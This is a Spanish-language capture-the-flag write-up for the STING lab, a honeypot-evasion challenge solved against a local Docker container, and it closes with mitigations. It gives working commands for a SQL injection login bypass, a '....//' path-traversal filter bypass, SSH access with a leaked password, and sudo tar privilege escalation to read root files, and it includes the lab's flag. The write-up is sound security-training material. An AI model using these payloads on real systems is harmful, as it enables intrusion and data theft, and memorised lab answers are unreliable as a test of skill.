# STING — WHOAMI-LABS.COM

**Laboratorio:** STING
**Categoría:** Honeypot evasion / web + escalada Linux
**Dificultad:** insano (8 puntos)
**Objetivo:** contenedor Docker local (`172.17.0.2`, expuesto en `127.0.0.1`)
**Estado:** resuelto

## Resumen

El laboratorio publica seis puertos falsos atendidos por `nc -l` con banners
estáticos (FTP, SSH, HTTP, MSSQL, MongoDB) y esconde detrás tres servicios
reales: Apache en `8080`, MySQL interno en `127.0.0.1:3306` y un SSH real en
`31337` con el usuario `beekeeper`. El acceso se abre con SQL injection ciega
en el login, avanza con un path traversal en el visor de logs y cierra con el
`sudo NOPASSWD /bin/tar` de `beekeeper`, que copia los tres fragmentos de la
flag repartidos en archivos con permisos `600`/`700`.

```text
Flag: H0N3YTR4P{d3c0y_d3t3ct3d_3v4s10n_m4st3r_2026}
```

## Despliegue

El `startlab.sh` del paquete falla en este host porque mapea el SSH falso al
puerto `22`, ocupado por el `sshd` local:

```text
failed to bind host port 0.0.0.0:22/tcp: address already in use
```

Se levantó el contenedor con el mismo comando pero re-mapeando ese puerto a
`2222`:

```bash
docker load -i sting.tar
docker run -d --name sting --privileged \
  -p 21:21 -p 2222:22 -p 9000:9000 -p 3306:3306 -p 1433:1433 \
  -p 27017:27017 -p 8080:8080 -p 31337:31337 \
  --hostname sting sting
```

Evidencia: [evidence/sting/01-port-scan.txt](evidence/sting/01-port-scan.txt)

## Reconocimiento: qué es señuelo y qué es real

| Puerto | Respuesta observada | Veredicto |
| --- | --- | --- |
| 21 | `220 FTP Server Ready` (banner fijo) | `nc -l` falso |
| 2222 (22) | `SSH-2.0-OpenSSH_7.4` + `Protocol mismatch` | `nc -l` falso |
| 9000 | `HTTP/1.1 200 OK` con `It works!` (respuesta fija) | `nc -l` falso |
| 1433, 27017 | cierra sin enviar datos | `nc -l` falso |
| 8080 | Apache/2.4.41 responde de verdad | real |
| 3306 | no responde desde la red (ver nota) | real, solo interno |
| 31337 | `SSH-2.0-OpenSSH_8.2p1` con banner ASCII `BACKUP SERVICE v2.7` | real |

Nota sobre 3306: `mysqld` hace `bind-address = 127.0.0.1`, así que el puerto
publicado por Docker no responde a la IP del contenedor y el banner falso de
MySQL nunca llega a arrancar (`nc: Address already in use` en
`/opt/honeypot/logs/mysql.log`). El MySQL útil para el ataque es el de la
aplicación, no un cliente externo.

## Cadena de ataque

### 1. SQL injection ciega en el login (8080)

`index.php` concatena el usuario sin sanitizar y sólo compara el `md5` de la
contraseña; no hay salida, sólo éxito/fallo (blind SQLi):

```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8080/index.php \
  --data-urlencode "username=admin' OR '1'='1' -- " \
  --data-urlencode "password=x"
# HTTP/1.1 302 Found  ->  Location: dashboard.php
```

Evidencia: [evidence/sting/02-sqli-login.txt](evidence/sting/02-sqli-login.txt)

### 2. Path traversal en el visor de logs

`logs.php` bloquea rutas absolutas (`$file[0] === '/'`) y aplica
`str_replace('../', '', $file)` **una sola vez**, lo que se bypasea con `....//`
(el reemplazo deja `../` vivo). Hay que bajar tres niveles desde
`/var/www/html`:

```bash
# FLAG_PART_1
curl -b cookies.txt "http://127.0.0.1:8080/logs.php?file=....//....//....//opt/honeypot/logs/honeypot.log"
# Flag: H0N3YTR4P{d3c0y_

# ssh_backup.conf -> puerto y usuario del servicio oculto
curl -b cookies.txt "http://127.0.0.1:8080/logs.php?file=....//....//....//opt/honeypot/config/ssh_backup.conf"
# port=31337  user=beekeeper
```

El panel también ofrece `FAKE{n1c3_try_but_wr0ng_fl4g}` en `/var/www/html/.flag.txt`
y `STING{this_is_not_the_real_flag}` en `/opt/honeypot/.secret`: señuelos.

Evidencia: [evidence/sting/03-lfi-honeypot.txt](evidence/sting/03-lfi-honeypot.txt)

### 3. La clave SSH está en el JavaScript del panel

Tras la sesión, `config.php` expone en claro la contraseña de `beekeeper`:

```javascript
var apiKey = "Qu33n0fH1v3"
```

Evidencia: [evidence/sting/04-config-apikey.txt](evidence/sting/04-config-apikey.txt)

### 4. SSH real en 31337

```bash
ssh -p 31337 beekeeper@127.0.0.1   # clave: Qu33n0fH1v3
# banner: BACKUP SERVICE v2.7 / Authorized Personnel Only
sudo -l
# User beekeeper may run the following commands on sting:
#     (root) NOPASSWD: /bin/tar
```

Evidencia: [evidence/sting/05-ssh-beekeeper.txt](evidence/sting/05-ssh-beekeeper.txt)

### 5. Escalada con `tar` y ensamblaje de la flag

`tar` copia archivos con los permisos de quien lo ejecuta, así que con
`sudo NOPASSWD` sirve de lector arbitrario para los tres fragmentos:

```bash
sudo /bin/tar -cf /tmp/leak.tar \
  /root/.secret/final.key /home/worker/.bash_history \
  /var/log/mysql/.hidden/.system_check
mkdir -p /tmp/x && tar -xf /tmp/leak.tar -C /tmp/x
cat /tmp/x/root/.secret/final.key          # m4st3r_2026}
grep flag_part2 /tmp/x/home/worker/.bash_history
# echo "d3t3ct3d_3v4s10n_" > /tmp/.flag_part2
```

```text
H0N3YTR4P{d3c0y_     (honeypot.log)
  + d3t3ct3d_3v4s10n_ (bash_history de worker)
  + m4st3r_2026}      (/root/.secret/final.key)
= H0N3YTR4P{d3c0y_d3t3ct3d_3v4s10n_m4st3r_2026}
```

La comparación con el archivo que lee el validador del script
(`/var/log/mysql/.hidden/.system_check`) coincide byte a byte.

Evidencia: [evidence/sting/06-escalada-flag.txt](evidence/sting/06-escalada-flag.txt)

## Nota de cierre

La resolución se obtuvo íntegramente por la superficie expuesta (web → SSH →
sudo). La inspección del interior del contenedor (`docker exec`) se usó sólo
para confirmar el diseño del honeypot después de resolver, no para leer la
flag; el recurso del validador se tomó como referencia de comparación, no como
vía de resolución. El validador interactivo de `startlab.sh` no se ejecutó
(compite por el puerto 22 con el `sshd` del host), la validación fue la
comparación directa de la flag ensamblada.

## Mitigaciones

- **Web**: parametrizar la consulta (`prepared statements`) en `index.php`.
- **Log viewer**: rechazar cualquier `..` de forma repetida y normalizar la
  ruta con `realpath()` contra un directorio base permitido.
- **Config**: no exponer credenciales en JavaScript ni en respuestas HTML.
- **sudo**: retirar el `NOPASSWD: /bin/tar` de `beekeeper`; si el backup es
  necesario, acotarlo con un wrapper que sólo permita rutas de respaldo.
- **Honeypot**: los banners falsos por `nc -l` se distinguen de un servicio
  real porque no implementan protocolo; el valor del lab está en detectar los
  tres servicios ocultos, no en escanear el resto.
